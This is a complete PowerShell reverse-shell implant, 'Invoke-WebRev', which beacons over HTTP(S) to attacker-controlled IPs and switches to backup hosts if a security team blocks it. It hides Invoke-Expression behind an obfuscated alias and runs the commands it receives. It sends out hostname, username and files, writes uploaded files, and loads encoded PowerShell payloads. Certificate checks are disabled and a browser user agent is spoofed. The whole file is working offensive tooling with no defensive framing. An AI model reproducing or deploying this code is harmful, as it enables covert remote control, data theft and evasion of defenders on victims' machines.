function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )
    #Original author 3v4Si0N
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
    
    [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
    $hosts = @('192.168.1.20','192.168.1.21') #If I lost connection or SOC blocks our domain, we can try to connect to the others computers
    $pwd_b64 = getPwd;
    $hname = toBase64 -str "$env:computername";
    $cuser = toBase64 -str "$env:username";

    $strhash = Get-StringHash;
    $clientid = toBase64 -str $strhash;
    $type = '"type":"newclient"';
    $json = '{' + $type + ', "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}';
    $headers = @{'X-Request-ID' = $strhash;}
    $sleepTime = 5;
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    try { $error[0] = ""; } catch {}
    $i=0
    $previous_functions = (ls function:).Name;
    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );

    while ($true)
    {
        try
        {
	        start-sleep -s $sleepTime
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -Headers $headers -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "autocomplete")
            {
                $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
                $functs = toBase64 -str "$functs";
                $type = '"type":"4UT0C0MPL3T3"';
                $result = $functs;
            }
            elseif($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    if ($cstr.split(" ").Length -eq 3) {
                        $location = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                    }
                    else {
                        $location = $cstr.split(' ') | Select-Object -Last 1;;
                    }
                    $content = [System.Convert]::FromBase64String($uploadData);
                    $content | Set-Content $location -Encoding Byte
                    $result = '[+] File successfully uploaded.';
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                try
                {
                    if ($cstr.split(" ").Length -eq 3){
                        $cstr = $cstr.Replace('"', '');
                        $pathSrc = $cstr.split(" ")[1];
                        $pathDst = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
                        if ($cstr.split(' ')[1][0] -eq '"') {
                            $pathSrc = $cstr.split('"')[1];
                        } else {
                            $pathSrc = $cstr.split(' ')[1];
                        }
                        $pathDst = $cstr.split('"')[-2];
                    }
                    else{
                        $pathSrc = $cstr.split('"')[1];
                        $pathDst = $cstr.split(' ')[-1];
                    }

                    if (Test-Path -Path $pathSrc) 
                    {
                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                        $b64 = [System.Convert]::ToBase64String($downloadData);
                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
                    } 
                    else
                    {
                        $type = '"type":"3RR0R"';
                        $result = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "loadps1")
            {
                $type = '"type":"L04DPS1"';
                try
                {
                    $loadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    $loadData = $loadData.ToCharArray();
                    [array]::Reverse($loadData);
                    $loadData = -join($loadData);
                    $content = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($loadData));
                    taleska-ei-vrixeka $content | Out-String;
                    $result = '[+] File loaded sucessfully.'
                }
                catch
                {
                    $type = '"type":"3RR0R"';
                    $result = '[!] Error loading PS1!';
                }
            }
            elseif($cstr.split(" ")[0] -eq "sleep")
            {
                $type = '"type":"SL33P"';
                try
                {
                    #test if cstr have 2 words
                    if ($cstr.split(" ").Length -eq 2) {
                        $sleepTime = $cstr.split(" ")[1];
                        #check if sleepTime is a number and if it's bigger than 0
                        if ($sleepTime -eq [System.Int32]::Parse($sleepTime) -and $sleepTime -gt 0) {
                            start-sleep -s $sleepTime
                            $result = '[+] Sleep sucessfully. Now the request will be sent after ' + $sleepTime + ' seconds.'
                        }
                        else {
                            $type = '"type":"3RR0R"';
                            $result = '[!] Sleep time must be a number and bigger than 0!';
                        }
                    }
                }
                catch
                {
                    $type = '"type":"3RR0R"';
                    $result = '[!] Error loading PS1!';
                }
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $bytes2 = $enc.GetBytes($result);
                $result = [Convert]::ToBase64String($bytes2 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $pwd_b64 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";
                    $i+=1;
                    if ($i -gt $hosts.Length){ $i = 0; }
                    $ip=$hosts[$i]; #We lose the connectio, and try another hosts.
                    $type = '"type":"newclient"'; #Always that client is new, we send him a new client.
                    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
                    $bytes = $enc.GetBytes($err);
                    $result = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '", "clientid":"' + $clientid + '"}'
                } catch {}
            }
        };
    };
}

function toBase64
{
    Param([String] $str)

    $enc = [system.Text.Encoding]::UTF8;
    $bytes = $enc.GetBytes($str);
    $result = [Convert]::ToBase64String($bytes);
    return $result;
}

function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($pwd_res);
    $pwd_b64 = [Convert]::ToBase64String($bytes);
    return $pwd_b64;
}

function Get-ImportedFunctions
{
    $menu = ""

    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
        $current_functions = (ls function:).Name
        [array]$preloaded_functions = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
        $current_functions = $current_functions + $preloaded_functions
        $new_functions = (Compare-Object -ReferenceObject $previous_functions -DifferenceObject $current_functions).InputObject
        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
        $menu = $menu + $output + "`n";
    } else {
        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
        $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
        $show_functions = $show_functions -replace "  ","" 
        $menu = $menu + $show_functions + "`n"
        $menu = $menu -replace " [+]","[+]"
    }
    return $menu;
}

function Get-StringHash
{ 
    $randstr = -join ((65..90) + (97..122) | Get-Random -Count 25 | % {[char]$_});
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($randstr);
    $algorithm = [System.Security.Cryptography.HashAlgorithm]::Create('MD5');
    $StringBuilder = New-Object System.Text.StringBuilder;
  
    $algorithm.ComputeHash($bytes) | ForEach-Object { $null = $StringBuilder.Append($_.ToString("x2")); } 
    return $StringBuilder.ToString();
}



#Invoke-WebRev -ip 192.168.1.20 -port 443 -ssl;
